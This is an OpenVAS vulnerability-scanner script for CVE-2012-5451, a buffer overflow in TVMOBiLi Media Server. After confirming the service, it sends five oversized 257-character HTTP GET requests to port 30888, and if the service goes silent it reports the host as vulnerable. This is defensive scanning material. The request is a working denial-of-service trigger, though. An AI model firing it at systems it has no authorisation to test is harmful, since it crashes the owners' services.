###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_tvmobili_media_server_mult_bof_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# TVMOBiLi Media Server HTTP Request Multiple BOF Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute the
  arbitrary code or cause a DoS (Denial of Service) and potentially
  compromise a vulnerable system.
  Impact Level: System/Application";
tag_affected = "TVMOBiLi Media Server version 2.1.0.3557 and prior";
tag_insight = "Improper handling of URI length within the 'HttpUtils.dll' dynamic-link
  library. A remote attacker can send a specially crafted HTTP GET request
  of 161, 257, 255  or HTTP HEAD request of 255, 257 or 260 characters long
  to 30888/TCP port and cause a stack-based buffer overrun that will crash
  tvMobiliService service.";
tag_solution = "Update to TVMOBiLi Media Server 2.1.3974 or later,
  For updates refer to http://www.tvmobili.com/";
tag_summary = "This host is running TVMOBiLi Media Server and is prone to multiple
  buffer overflow vulnerabilities.";

if(description)
{
  script_id(803125);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-5451");
  script_bugtraq_id(56853);
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-12-10 10:36:49 +0530 (Mon, 10 Dec 2012)");
  script_name("TVMOBiLi Media Server HTTP Request Multiple BOF Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;


  script_description(desc);
  script_summary("Check if TVMOBiLi Media Server is vulnerable to DOS");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_require_ports("Services/www", 30888);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/88174");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/51465/");
  script_xref(name : "URL" , value : "http://dev.tvmobili.com/changelog.php");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2012/Dec/54");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/23254/");
  script_xref(name : "URL" , value : "http://forum.tvmobili.com/viewtopic.php?f=7&amp;t=55117");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = "";
banner = "";
req = "";
res = "";

## Get HTTP Port
port = get_http_port(default:30888);
if(!port){
  port = 30888;
}

## Check Port State
if(!get_port_state(port)) {
  exit(0);
}

## Check Banner And Confirm Application
banner = get_http_banner(port:port);
if("Server: " >!< banner && "TVMOBiLi UPnP Server/" >!< banner){
  exit(0);
}

## Cross Check the application with response
req = http_get(item:string("/__index"), port:port);
res = http_send_recv(port:port, data:req);

## Exit if application confirmation fails
if('>TVMOBiLi' >!< res && 'TVMOBiLi LTD' >!< res){
  exit(0);
}

# Construct attack request
req = http_get(item:string("/", crap(data: "A", length: 257)), port:port);

## Send the attack request multiple time
for(i=0; i<5; i++){
  res = http_send_recv(port:port, data:req);
}

banner = get_http_banner(port:port);

## Confirm the  working exploit with banner
if(!banner && "TVMOBiLi UPnP Server/" >!< banner)
{
  security_hole(port);
  exit(0);
}

## Some time even application crashed
## It  responds and gives banner.
## So cross check with the content of the page
req = http_get(item:string("/__index"), port:port);
res = http_send_recv(port:port, data:req);

## if did not get anything from the server report the warning
if(!res &&  '>TVMOBiLi' >!< res && 'TVMOBiLi LTD' >!< res){
  security_hole(port);
}
